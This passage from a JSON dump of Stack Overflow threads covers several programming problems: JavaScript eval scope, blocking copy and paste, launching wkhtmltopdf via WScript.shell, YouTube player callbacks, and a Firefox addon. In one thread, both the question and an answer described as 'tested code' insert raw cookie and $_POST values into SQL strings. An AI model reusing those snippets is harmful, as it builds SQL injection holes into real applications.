                    "body": "<p><strong>Edit:</strong> <a href=\"http://stackoverflow.com/questions/15409639/how-to-execute-different-partsof-the-js-code-in-one-scope/15409716#comment21790093_15409716\">Bergi</a> pointed out my original answer was wrong, he is correct. Since <code>eval</code> runs in its own scope and the function constructor still runs in function scope according to the <a href=\"http://es5.github.com/#x10.4.2\" rel=\"nofollow\">spec</a> this is not possible with either.</p>\n\n<p>While I have done this sort of thing myself several times with node.js using the <code>vm</code> module where you get much finer grain of control over where your code executes, it seems browsers require a different approach.</p>\n\n<p>The only way you can share variables in such a way is to do so in the global scope of JavaScript execution (possibly, in an iframe). One way you could do this is script tag injection.</p>\n\n<pre><code>function run(code){\n    var sc = document.createElement(\"script\");\n    sc.setAttribute(\"type\",\"text/javascript\");\n    sc.innerHTML = code;\n    document.body.appendChild(sc);\n}\n\nrun(\"var x = 5\");\nrun(\"document.write(x)\");\n</code></pre>\n\n<p>(<a href=\"http://codepen.io/anon/pen/exynf\" rel=\"nofollow\">here is this code in action</a>)</p>\n\n<p>As for the scope wrapper, instead of injecting them in the same frame inject them in another <code>iframe</code>. That will scope their window object to that iframe and will allow you to share context.</p>\n\n<p>I humbly apologize for my previous answer, I misread the spec. I hope this answer helps you.</p>\n\n<p>I'm leaving my previous answer here because I still believe it provides some insight into how <code>eval</code> and the <code>Function</code> constructor work.</p>\n\n<hr>\n\n<p>When running code in non-strict mode <code>eval</code> runs in the current context of your page\nAfter your function declaration is done, the scope it was declared in dies, and with it the function. </p>\n\n<p>Consider using the <a href=\"https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function#Example.3A_Specifying_arguments_with_the_Function_constructor\" rel=\"nofollow\">Function constructor</a> and then <code>.call</code>ing it</p>\n\n<p>In your case that would be something like:</p>\n\n<pre><code>var scopeWrapper = {}; \nscopeWrapper.run = function(code){\n    var functionToRun = new Function(code);\n    functionToRun.call(scopeWrapper);\n}\nscopeWrapper.run('this.test = function() { alert(\"passed\"); }');\nscopeWrapper.run(\"this.test()\")\n</code></pre>\n\n<p>Here is a reference directly <a href=\"http://es5.github.com/#x10.4.2\" rel=\"nofollow\">from the spec:</a></p>\n\n<blockquote>\n  <p>If there is no calling context or if the eval code is not being evaluated by a direct call (15.1.2.1.1) to the eval function then,\n  Initialize the execution context as if it was a global execution context using the eval code as C as described in 10.4.1.1.</p>\n</blockquote>\n\n<p>If this code is run in the node.js consider using the <a href=\"http://nodejs.org/api/vm.html\" rel=\"nofollow\">vm</a> module. Also note that this approach is still not secure in the way it'll allow code you run to change your code.</p>\n",
                    "is_accepted": true,
                    "score": 8
                },
                {
                    "body": "<p><code>test</code> only exists in the scope of <code>this.run</code> and only at call time :</p>\n\n<pre><code>// global scope\n(function(){\n  // local scope (equivalent of your \"run\" function scope)\n  eval('function f(){};');\n  console.log(f); // prints \"function f(){}\"\n})();\nconsole.log(f); // prints \"ReferenceError: f is not defined\"\n</code></pre>\n\n<p>Each call of <code>run</code> creates a new scope in which each <code>code</code> is evaluated separately.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I have several script blocks depend on each other. I need to perform them in one scope.</p>\n\n<p>My attempt:</p>\n\n<pre><code>var scopeWrapper = {}; \n\nwith(scopeWrapper) {\n    (function() {\n        this.run = function(code) {\n            eval(code);\n        };\n    }).call(scopeWrapper);\n}\n\nscopeWrapper.run('function test() { alert(\"passed\"); }');\nscopeWrapper.run('test();');\n</code></pre>\n\n<p>I get 'test is not defined' error. It seems that the code is executed in different scopes.\nWhy is this happening?</p>\n",
            "last_activity_date": 1374846296,
            "question_id": 15409639,
            "score": 3,
            "tags": [
                "javascript",
                "scope"
            ],
            "title": "How to execute different partsof the JS code in one scope"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<ul>\n<li>I don't like when browsers do this to me, and</li>\n<li>It's easy to work around, and</li>\n<li>This doesn't count as \"secure\" by any definition, but</li>\n</ul>\n\n<hr>\n\n<p>Use <code>element.on(?:</code><a href=\"https://developer.mozilla.org/en-US/docs/DOM/element.oncopy\"><code>copy</code></a>|<a href=\"https://developer.mozilla.org/en-US/docs/DOM/element.oncut\"><code>cut</code></a>|<a href=\"https://developer.mozilla.org/en-US/docs/DOM/element.onpaste\"><code>paste</code></a><code>)</code></p>\n\n<pre><code>&lt;body oncopy=\"return false\" oncut=\"return false\" onpaste=\"return false\"&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>you can use it jquery for this. You need to just find the <code>cut</code>, <code>copy</code> and <code>paste</code> function with your element. </p>\n\n<p>And add this Jquery script:</p>\n\n<pre><code>$(document).ready(function () {\n    $('#Selector').bind('copy paste', function (e) {\n       e.preventDefault();\n    });\n  });\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 6
                }
            ],
            "body": "<p>I am making this javascript code in order to disable Ctlr+c and Ctlr+v, prenscreen, ALT+TAB, Ctlr+S, and PrintScreen keys.</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n&lt;script language=\"javascript\"&gt;\n\nfunction Disable_Control_C() {\nvar keystroke = String.fromCharCode(event.keyCode).toLowerCase();\n\nif (event.ctrlKey &amp;&amp; (keystroke == 'c' || keystroke == 'v')) {\nalert(\"let's see\");\nevent.returnValue = false; // disable Ctrl+C\n}\n}\n\n&lt;/script&gt;\n&lt;/head&gt;\n&lt;body onkeydown=\"javascript:Disable_Control_C()\"&gt;\nHello World!\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>unfortunately, code is working on IE browser, but not working on firefox. Can anyone here advice?</p>\n",
            "last_activity_date": 1363204289,
            "question_id": 15394957,
            "score": 3,
            "tags": [
                "javascript"
            ],
            "title": "How to disable Ctrl C/V using javascript for both internet explorer and firefox browsers"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>According to the following:</p>\n\n<p><a href=\"http://msdn.microsoft.com/en-us/library/d5fk67ky%28v=vs.84%29.aspx\" rel=\"nofollow\">http://msdn.microsoft.com/en-us/library/d5fk67ky%28v=vs.84%29.aspx</a></p>\n\n<p>You should be able to pass the commands directly as part of the <code>strCommand</code> param, you'd probably be better off getting rid of the extra quotes wrapping the entire command and arguments:</p>\n\n<pre><code>function callShellApplication(){\n  var objShell = new ActiveXObject(\"WScript.shell\");\n  objShell.run('c:\\wkhtmltopdf.exe c:\\PDFTestPage.html c:\\TEST.pdf');\n}\n</code></pre>\n\n<p>Also you should be able to handle spaces in paths by wrapping each item in quotes, like so:</p>\n\n<pre><code>function callShellApplication(){\n  var objShell = new ActiveXObject(\"WScript.shell\");\n  objShell.run('\"C:\\Program Files (x86)\\wkhtmltopdf\\wkhtmltopdf.exe\" \"c:\\PDFTestPage.html\" \"c:\\TEST.pdf\"');\n}\n</code></pre>\n\n<p>You should also keep in mind whether you want to <code>bWaitOnReturn</code> or not, and which <code>intWindowStyle</code> you need (some executables may benefit from a particular style).</p>\n\n<p>Also just as a cautionary note &mdash; it's been a while since I've used <code>WScript.shell</code> &mdash; but you may need to escape your backslashes in your paths. So a path may need to look like the following:</p>\n\n<pre><code>objShell.run('\"C:\\\\Program Files (x86)\\\\wkhtmltopdf\\\\wkhtmltopdf.exe\"');\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 3
                },
                {
                    "body": "<p>For anyone else that comes across this issue, I had a similar (but slightly different) problem that I thought I'd share.</p>\n\n<p>I too wanted to run a command using the <code>ActiveXObject(\"WScript.shell</code>. I needed to run a <code>.bat</code> script that would launch Google Chrome to a specific URL.</p>\n\n<p>The JS I had was as follows:</p>\n\n<pre><code>var objShell = new ActiveXObject(\"WScript.shell\");\nobjShell.run('\"C:\\\\Scripts\\\\MyChromeBat.bat\" MY_URL');\n</code></pre>\n\n<p>This would properly launch my <code>.bat</code> script which was very simple:</p>\n\n<pre><code>start \"\" chrome.exe %1\n</code></pre>\n\n<p>The issue I came across was that <code>MY_URL</code> contained some query parameters and when I used the above JS, the query params would be stripped to an extent. So when I was trying to open </p>\n\n<pre><code>http://localhost:8080/webapp/mypage.html?param1=test&amp;param2=test2\n</code></pre>\n\n<p>it would actually open</p>\n\n<pre><code>http://localhost:8080/webapp/mypage.html?param1\n</code></pre>\n\n<p>The fix turned out to be simple - I had to surround <code>MY_URL</code> in quotes. So I modified the line</p>\n\n<pre><code>objShell.run('\"C:\\\\Scripts\\\\MyChromeBat.bat\" MY_URL');\n</code></pre>\n\n<p>to be</p>\n\n<pre><code>objShell.run('\"C:\\\\Scripts\\\\MyChromeBat.bat\" \"MY_URL\"');\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I am working on calling a .exe file with a  WScript.shell activeX. The file is wkhtmltopdf.exe and it is used to convert a HTML page to a .pdf. Everything is working well when I am just calling C:\\wkhtmltopdf.exe in the code. It runs and then closes correctly. But my issue is you need to run it from cmd with the program name then the HTML file name you are reading followed by the .pdf name you want it to be created as. </p>\n\n<p>For example: </p>\n\n<pre><code>c:\\wkhtmltopdf.exe c:\\PDFTestPage.html c:\\TEST.pdf\n</code></pre>\n\n<p>This will call wkhtmltopdf.exe, read c:\\PDFTestPage.html, then create c:\\TEST.pdf. Works fine when I type it into cmd. </p>\n\n<p>Does anyone know an activeX that will not just run and .exe but actually execute a command line?</p>\n\n<p>Here is my code that I am currently using. </p>\n\n<pre><code>function callShellApplication(){\nvar objShell = new ActiveXObject(\"WScript.shell\");\nobjShell.run('\"c:\\wkhtmltopdf.exe\"');\n}\n</code></pre>\n\n<p>Would really like it to be the following.</p>\n\n<pre><code>function callShellApplication(){\nvar objShell = new ActiveXObject(\"WScript.shell\");\nobjShell.run('\"c:\\wkhtmltopdf.exe c:\\PDFTestPage.html c:\\TEST.pdf\"');\n}\n</code></pre>\n\n<p>Also side note. For some reason I cant launch the .exe from an absolute path. I have to move to the directory and then just type in wkhtmltopdf.exe. The fill path is:</p>\n\n<pre><code>C:\\Program Files (x86)\\wkhtmltopdf\\wkhtmltopdf.exe\n</code></pre>\n\n<p>I really only work with UNIX so I'm not sure about spaces in the path. I can do a chdir with the spaces but I cant use the fill path when executing it. Any information would be helpful. Thank you in advance.  </p>\n",
            "last_activity_date": 1421771224,
            "question_id": 15351508,
            "score": 3,
            "tags": [
                "javascript",
                "cmd",
                "activex"
            ],
            "title": "Using a WScript.shell activeX to execute a command line"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>You're confusing two different player APIs here. </p>\n\n<p>Do you want to use the <strong>iframe player</strong>? If so, you'll want to look at: <a href=\"https://developers.google.com/youtube/iframe_api_reference\">https://developers.google.com/youtube/iframe_api_reference</a>.</p>\n\n<p>Instead of defining <code>onYouTubePlayerReady</code>, you'll want to define the following method: <code>onYouTubeIframeAPIReady</code>, create your player, and then assign an <code>onPlayerReady</code> callback.</p>\n\n<p>Make sure you're including the JavaScript for the iframe player API, in order for <code>onYouTubeIframeAPIReady</code> to be called:</p>\n\n<pre><code>var tag = document.createElement('script');\ntag.src = o.protocol + \"://www.youtube.com/iframe_api\";\nvar firstScriptTag = document.getElementsByTagName('script')[0];\nfirstScriptTag.parentNode.insertBefore(tag, firstScriptTag);\n</code></pre>\n\n<hr>\n\n<p>Worth noting from the doc, since you're writing the iframe instead of using JavaScript to do that for you: </p>\n\n<blockquote>\n  <p>If you do write the  tag, then when you construct the\n  YT.Player object, you do not need to specify values for the width and\n  height, which are specified as attributes of the  tag, or the\n  videoId and player parameters, which are are specified in the src URL.</p>\n</blockquote>\n\n<p>Also, in your mutePlayPauseUnmute function..</p>\n\n<pre><code>playerid.mute();\nplayerid.playVideo();\nplayerid.pauseVideo();\nplayerid.unMute();\n</code></pre>\n\n<p>You'll want to trigger the actual the methods on the <code>player</code> as opposed to the <code>playerid</code> as described above.</p>\n",
                    "is_accepted": true,
                    "score": 8
                }
            ],
            "body": "<p>I want to load a YouTube video, then mute, play, pause, and unmute it immediately. In doing this, I hope to present the user with a video that doesn't have a big play button on it, and does have the controls on the bottom. In order to do this, I have the following code:</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\nfunction onYouTubePlayerReady(playerid)\n{\n    mutePlayPauseUnmute(playerid);\n}\nfunction onYouTubePlayerAPIReady(playerid)\n{\n    mutePlayPauseUnmute(playerid);\n}\nfunction onYouTubeIframeAPIReady(playerid)\n{\n    mutePlayPauseUnmute(playerid)\n}\nfunction onPlayerReady(playerid)\n{\n    mutePlayPauseUnmute(playerid)\n}\n\nfunction mutePlayPauseUnmute(playerid)\n{\n    var player = document.getElementById(playerid);\n    player.mute();\n    player.playVideo();\n    player.pauseVideo();\n    player.unMute();\n}\n&lt;/script&gt;\n&lt;iframe id=\"quotedVideo1\" type=\"text/html\" width=\"246\" height=\"160\" src=\"https://www.youtube.com/embed/NWHfY_lvKIQ?modestbranding=1&amp;rel=0&amp;showinfo=0&amp;autohide=1&amp;iv_load_policy=3&amp;theme=light&amp;enablejsapi=1&amp;playerapiid=quotedVideo1\" frameborder=\"0\"&gt; &lt;!-- Magic Comment --&gt; &lt;/iframe&gt;\n</code></pre>\n\n<p>However, upon inspection, neither <code>onYouTubePlayerReady</code>, <code>onYouTubePlayerAPIReady</code>, <code>onYouTubeIframeAPIReady</code>, <code>onPlayerReady</code>, nor <code>mutePlayPauseUnmute</code> is ever called. <strong>What have I done wrong?</strong> According to <a href=\"https://developers.google.com/youtube/js_api_reference#onYouTubePlayerReady\" rel=\"nofollow\">https://developers.google.com/youtube/js_api_reference#onYouTubePlayerReady</a> it looks like it should work, but it doesn't.</p>\n",
            "last_activity_date": 1361473348,
            "question_id": 15003597,
            "score": 3,
            "tags": [
                "javascript",
                "youtube-api",
                "youtube-javascript-api"
            ],
            "title": "Why isn&#39;t the YouTube iframe player calling onYouTubePlayerReady when it&#39;s loaded?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<pre><code>&gt;&gt;&gt; import json\n&gt;&gt;&gt; weird_json = '{\"x\": 1, \"x\": 2, \"x\": 3}'\n&gt;&gt;&gt; x = json.loads(weird_json)\n&gt;&gt;&gt; x\n{u'x': 3}\n&gt;&gt;&gt; y = json.loads('[\"foo\", {\"bar\":[\"baz\", null, 1.0, 2]}]')\n&gt;&gt;&gt; y\n[u'foo', {u'bar': [u'baz', None, 1.0, 2]}]\n</code></pre>\n\n<p>You can take the HTML data, and convert it into a dictionary, enabling you to do:\n<code>print x['x']</code></p>\n\n<p>This is the starting point, create a socket in Python which listens to a port.\nThen have it recieve data.</p>\n\n<p>In Javascript, open a socket which can connect to a port (the one Python listens to).\nUse, say: <a href=\"http://socket.io/\">http://socket.io/</a></p>\n\n<p>This is a pure socket-to-socket related issue?\n<br>\n<br>\n<br></p>\n\n<h2>A working relationship between Python and Javascript (on port 80):</h2>\n\n<pre><code>from socket import *\nimport json\ns = socket()\ns.bind(('', 80))\ns.listen(4)\nns, na = s.accept()\n\nwhile 1:\n    try:\n        data = ns.recv(8192)\n    except:\n        ns.close()\n        s.close()\n        break\n\n    data = json.loads(data)\n    print data\n</code></pre>\n\n<p>There you got a socket listening to 80, connect to that and send whatever you want.</p>\n\n<pre><code>function callPython()\n{\nvar xmlhttp;\nif (window.XMLHttpRequest)\n  {// code for IE7+, Firefox, Chrome, Opera, Safari\n  xmlhttp=new XMLHttpRequest();\n  }\nelse\n  {// code for IE6, IE5\n  xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\");\n  }\nxmlhttp.onreadystatechange=function()\n  {\n  if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)\n    {\n    document.getElementById(\"myDiv\").innerHTML=xmlhttp.responseText;\n    }\n  }\nxmlhttp.open(\"GET\",\"Form-data\",true);\nxmlhttp.send();\n}\n</code></pre>\n\n<p>For instance, where you can send the form data as a string, replacing \"Form-data\" and the response from Python can be put into \"myDiv\" :)</p>\n",
                    "is_accepted": true,
                    "score": 6
                },
                {
                    "body": "<p>Something like <a href=\"http://jeanphix.me/Ghost.py/\" rel=\"nofollow\">Ghost.py</a> should be able to do what you want. </p>\n\n<p>This allows evaluation of JavaScript.</p>\n\n<pre><code>result, resources = ghost.evaluate(\n    \"document.getElementById('my-input').getAttribute('value');\")\n</code></pre>\n\n<p>Which should help.</p>\n\n<p>I've used <a href=\"http://phantomjs.org\" rel=\"nofollow\">PhantomJS</a> the JS headless webkit browser and this is a port and/or reworking of that using Python.</p>\n\n<hr>\n\n<p>In my use case I just called <a href=\"http://phantomjs.org\" rel=\"nofollow\">PhantomJS</a> from <code>subprocess.call</code> as I couldn't be bothered to install the <code>Ghost</code> dependencies.</p>\n\n<p>I just emitted JSon to <code>stdout</code> and <code>json.loads</code> on it.</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I have an html form which is populated by javascript functions.  I have another javascript function which gets the values of all of the form elements, and currently just uses an alert to display them back to the user.  The html page is diplayed via python with the following code:</p>\n\n<pre><code>import webbrowser\nnew = 2 #open new tab if possible\nurl = \"form.html\"\nwebbrowser.open(url, new=new)\n</code></pre>\n\n<p>This all works well, but instead of displaying the data using an alert, I would like to pass the data back to python, but dont know how.  All of the data is stored in a javascript array, so I essentially just need to pass this one piece of data.</p>\n\n<p>EDIT:  I cannot use any external libraries.</p>\n",
            "last_activity_date": 1360347030,
            "question_id": 14778167,
            "score": 3,
            "tags": [
                "javascript",
                "python",
                "python-webbrowser"
            ],
            "title": "Return data from html/js to python"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>Use <strong>UTF-8</strong> when you create table.</p>\n\n<pre><code>create table table_name () CHARACTER SET = utf8;</code></pre>\n\n<p>Use <strong>UTF-8</strong> when you insert to table</p>\n\n<pre><code>set username utf8; INSERT INTO table_name (ABC,VAL);</code></pre>\n\n<p><a href=\"http://www.tanzilo.com/2008/10/13/php-mysql-unicode-solution-to-chinese-russian-or-any-language/\"><strong>Read More</strong></a></p>\n\n<p><a href=\"http://confluence.jetbrains.net/display/TCD/Configuring+UTF8+Character+Set+for+MySQL\"><strong>And More</strong></a></p>\n\n<p><strong>Detailed Code</strong></p>\n\n<p>Below code is tested code please do the following its works.</p>\n\n<p>If you have already created database please ALTER it as below code.\nAnd if you didn't created database then create it and set  Collation to utf8_unicode_ci</p>\n\n<p>And same for table define Collation as \"utf8_unicode_ci\" for table fields in which you want to store chines chars.</p>\n\n<pre><code>ALTER DATABASE `stackoverflow` DEFAULT CHARACTER SET utf8 COLLATE utf8_unicode_ci;\n\nCREATE TABLE `stackoverflow`.`chines`\n(\n    `id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY ,\n    `words` VARCHAR( 200 ) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL\n) ENGINE = InnoDB;</code></pre>\n\n<pre><code>&lt;?php\n\n    define('HOSTNAME', 'localhost');\n    define('USERNAME', 'root');\n    define('PASSWORD', '');\n    define('DATABASE', 'stackoverflow');\n\n    $dbLink = mysql_connect(HOSTNAME, USERNAME, PASSWORD)or die(mysql_error());\n    mysql_query(\"SET character_set_results=utf8\", $dbLink)or die(mysql_error());\n    mb_language('uni'); \n    mb_internal_encoding('UTF-8');\n    mysql_select_db(DATABASE, $dbLink)or die(mysql_error());\n    mysql_query(\"set names 'utf8'\",$dbLink)or die(mysql_error());\n\n    if(isset($_POST['addWord']))\n    {\n        mysql_query(\"SET character_set_client=utf8\", $dbLink)or die(mysql_error());\n        mysql_query(\"SET character_set_connection=utf8\", $dbLink)or die(mysql_error());\n\n        $sql_query = \"INSERT INTO chines(words) VALUES('\".$_POST['words'].\"')\";\n        mysql_query($sql_query, $dbLink)or die(mysql_error());\n    }\n\n?&gt;\n\n&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\"&gt;\n&lt;head&gt;\n    &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=UTF-8\" /&gt;\n    &lt;title&gt;&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;?php\n        mysql_query(\"SET character_set_results=utf8\", $dbLink);\n        $sql_query = \"SELECT * FROM chines\";\n        $dbResult = mysql_query( $sql_query, $dbLink)or die(mysql_error());\n\n    ?&gt;\n\n    &lt;form action=\"\" method=\"post\"&gt;\n\n        &lt;p&gt;Word : &lt;input type=\"text\" name=\"words\" /&gt;&lt;/p&gt;\n        &lt;p&gt;&lt;input type=\"submit\" name=\"addWord\" /&gt;&lt;/p&gt;\n\n    &lt;/form&gt;\n    &lt;?php\n        while($row = mysql_fetch_assoc($dbResult))\n        {\n            echo $row['words']. '&lt;br /&gt;';\n        }\n    ?&gt;\n&lt;/body&gt;\n&lt;/html&gt;</code></pre>\n\n<p>See the result and step visual as below.</p>\n\n<p><img src=\"http://i.stack.imgur.com/fODRl.png\" alt=\"enter image description here\"></p>\n",
                    "is_accepted": false,
                    "score": 9
                }
            ],
            "body": "<p>The cookie is encoded using the big5 set, and it cannot insert into MySQL. Could you help me to solve this problem?</p>\n\n<p>Fields: <code>username</code> is eng, <code>date1</code> is date, <code>reason1</code> is a Chinese character.</p>\n\n<pre><code>$reason1 = $_COOKIE[\"reason\"];\n$sql2=\"INSERT INTO \n    attendance_count(username,date,count_time,appendix) \n    VALUES ('$username','$date1','0','$reason1')\";\nmysql_query($sql2);\n</code></pre>\n",
            "last_activity_date": 1358917648,
            "question_id": 14456313,
            "score": 3,
            "tags": [
                "php",
                "javascript",
                "mysql",
                "character-encoding"
            ],
            "title": "Can&#39;t insert Chinese character into MySQL"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Your prototype is okay, the problem is that <code>this</code> on event handlers is always the element that caused the event to be triggered. <a href=\"https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Operators/this\">In JavaScript, the value of <code>this</code> inside a function depends on how the function is called</a>.</p>\n\n<p>If you want <code>this</code> to be bound to a certain value, you can create a bound function with <a href=\"https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function/bind\"><code>Function.prototype.bind</code></a>:</p>\n\n<pre><code>var newChangeName = this.changeName.bind(this);\nLink.onclick = newChangeName;\n</code></pre>\n\n<p>Note however that <code>bind</code> is IE9+ only. A workaround would be:</p>\n\n<pre><code>var that = this;\nLink.onclick = function() {\n    that.changeName();\n};\n</code></pre>\n\n<p>(Style note: I'd use <code>link</code> instead of <code>Link</code>; the convention in js is to leave uppercase initials to constructors).</p>\n",
                    "is_accepted": true,
                    "score": 11
                },
                {
                    "body": "<p>Use <a href=\"https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Function/bind\" rel=\"nofollow\"><code>bind</code></a> to set the desired <code>this</code> for the <code>changeName</code> callback:</p>\n\n<pre><code>Link.onclick=this.changeName.bind(this);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>This is a follow up question from my last question.</p>\n\n<p><a href=\"http://stackoverflow.com/questions/13996187/simple-javascript-prototype-issue\">Simple javascript prototype issue</a></p>\n\n<p>I am a bit new using JavaScript <code>prototype</code> so sorry for the second post.</p>\n\n<p>I want to assign the clicked element <code>id</code> to the <code>this.name</code> array.</p>\n\n<pre><code>task.prototype.init=function(){  \n      this.name=[];  //this.name array has to be defined here\n\n        for (var i; i&lt;5; i++){\n            var Link=document.createElement('a');\n                Link.innerHTML='click';\n                Link.id=value[i];   //I want to assign the value to the this.name array\n                Link.href='#'\n                Link.onclick=this.changeName;\n                document.body.appendChild(Link);\n         }\n}\ntask.prototype.changeName=function(){  \n\n     //How do I push the this.id to the property this.name?\n\n     //the code below won't work because this refer to the &lt;a&gt; element. \n     this.name.push(this.id);     \n\n    return false;\n    }\n</code></pre>\n\n<p>Any tips for the task?</p>\n",
            "last_activity_date": 1396357692,
            "question_id": 13996794,
            "score": 3,
            "tags": [
                "javascript"
            ],
            "title": "JavaScript prototype &#39;this&#39; issue"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>Sample.</p>\n\n<p>HTML:</p>\n\n<pre><code>&lt;input type=\"button\" onclick='pop = window.open(\"http://www.google.com\");' value=\"Click Me\" /&gt;\n&lt;a href=\"#\" onclick=\"pop.close();\"&gt;Close&lt;/a&gt;\n</code></pre>\n\n<p>Javascript:</p>\n\n<pre><code>   &lt;script&gt;\n       var pop;\n   &lt;/script&gt;\n</code></pre>\n\n<p>This works. Good luck!</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>have this code.</p>\n\n<pre><code>&lt;form ... onsubmit=\"window.location.assign('#close')\"&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<blockquote>\n  <p><a href=\"http://www.ericmmartin.com/projects/simplemodal/\" rel=\"nofollow\">SimpleModal</a> will automatically bind the close function (using the\n  onclick event) to any element inside the dialog with the\n  simplemodal-close class.</p>\n  \n  <p>In addition, you can programmatically close the currently opened\n  dialog by calling $.modal.close();</p>\n</blockquote>\n\n<p>This means: in your closeWindow()-function, you could simply enter the line:</p>\n\n<pre><code> $.modal.close();\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>for closing the dialog you can use,</p>\n\n<pre><code>$(\"#dialog-form\").dialog('close'); \n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<pre><code> $(document).ready(function()\n {\n     $(\"#create-user\").button().click(function()\n     {\n         $(\"#dialog-form\").load('test.html').dialog({ modal:true, }); \n     }); \n });\n</code></pre>\n\n<p>i have two page. from first page i want to call modal form with url test.html and i want to close the modal form from test.html page with Close</p>\n",
            "last_activity_date": 1355822370,
            "question_id": 13929326,
            "score": 3,
            "tags": [
                "javascript",
                "jquery-ui",
                "jquery"
            ],
            "title": "how do close modal form from another page"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>Sorry about the super-late reply.</p>\n\n<p>If I understand your question correctly, you have a P.O.S application that runs in Firefox talking to some sort of local webserver via HTTP. The client-side JavaScript of your application needs to be able to read &amp; write files from the local filesystem of the browser's PC.</p>\n\n<p>If that's correct, then you can do so as follows. You'll need to create a Firefox addon, the simpliest kind of which is called a \"bootstrapped\" (or \"restartless\") addon. </p>\n\n<hr>\n\n<p>A restartless addon consists of two files:</p>\n\n<ul>\n<li>bootstrap.js (The JavaScript file containing your 'privileged' code)</li>\n<li>install.rdf (an XML file describing your addon to Firefrox)</li>\n</ul>\n\n<p>To build the addon, simply place both files inside the top-level (no folders!) of a ZIP file with the file extension <code>.xpi</code>. To install the addon, navigate to <code>about:addons</code> then from the tools menu, click <code>Install from file</code>, find your XPI, open it, then after a short delay choose <code>Install</code>.</p>\n\n<hr>\n\n<p>In <code>install.rdf</code> put something like this:</p>\n\n<pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;RDF xmlns=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\" \n     xmlns:em=\"http://www.mozilla.org/2004/em-rdf#\"&gt;\n    &lt;Description about=\"urn:mozilla:install-manifest\"&gt;\n        &lt;em:id&gt;youraddonname@yourdomain&lt;/em:id&gt;\n        &lt;em:type&gt;2&lt;/em:type&gt;\n        &lt;em:name&gt;Name of your addon&lt;/em:name&gt;\n        &lt;em:version&gt;1.0&lt;/em:version&gt;\n        &lt;em:bootstrap&gt;true&lt;/em:bootstrap&gt;\n        &lt;em:description&gt;Describe your addon.&lt;/em:description&gt;\n        &lt;em:creator&gt;Your name&lt;/em:creator&gt;\n\n        &lt;!-- Firefox Desktop --&gt;\n        &lt;em:targetApplication&gt;\n            &lt;Description&gt;\n                &lt;em:id&gt;{ec8030f7-c20a-464f-9b0e-13a3a9e97384}&lt;/em:id&gt;\n                &lt;em:minVersion&gt;4.0.*&lt;/em:minVersion&gt;\n                &lt;em:maxVersion&gt;29.0.*&lt;/em:maxVersion&gt;\n            &lt;/Description&gt;\n        &lt;/em:targetApplication&gt;\n    &lt;/Description&gt;\n&lt;/RDF&gt;\n</code></pre>\n\n<hr>\n\n<p>You need to implement two mandatory JavaScript functions in the <code>bootstrap.js</code>:</p>\n\n<ul>\n<li><code>startup()</code> - called when you install the addon, and when your browser starts up.</li>\n<li><code>shutdown()</code> - called when you uninstall the addon, and when your browser shuts down.</li>\n</ul>\n\n<p>You should call the rest of your 'privileged' code in <code>startup()</code>. For hygiene, you can (and probably should) also implement <code>install()</code> and <code>uninstall()</code> functions.</p>\n\n<p>Start by implementing the following code in <code>bootstrap.js</code>:</p>\n\n<pre><code>const Cc = Components.classes;\nconst Ci = Components.interfaces;\nlet consoleService = Cc[\"@mozilla.org/consoleservice;1\"]\n                        .getService(Ci.nsIConsoleService);\nlet wm             = Cc[\"@mozilla.org/appshell/window-mediator;1\"]\n                        .getService(Ci.nsIWindowMediator);\n\nfunction LOG(msg) {\n  consoleService.logStringMessage(\"EXTENSION: \"+msg);    \n}\n\nfunction startup() {\n  try {\n    LOG(\"starting up...\");\n    let windows = wm.getEnumerator(\"navigator:browser\");\n    while (windows.hasMoreElements()) {\n      let chromeWindow = windows.getNext().QueryInterface(Ci.nsIDOMWindow);\n      WindowListener.setupBrowserUI(chromeWindow);\n    }\n    wm.addListener(WindowListener);\n    LOG(\"done startup.\");\n  } catch (e) {\n    LOG(\"error starting up: \"+e);\n  }\n}\n\nfunction shutdown() {\n  try {\n    LOG(\"shutting down...\");\n    let windows = wm.getEnumerator(\"navigator:browser\");\n    while (windows.hasMoreElements()) {\n      let chromeWindow = windows.getNext().QueryInterface(Ci.nsIDOMWindow);\n      WindowListener.tearDownBrowserUI(chromeWindow);\n    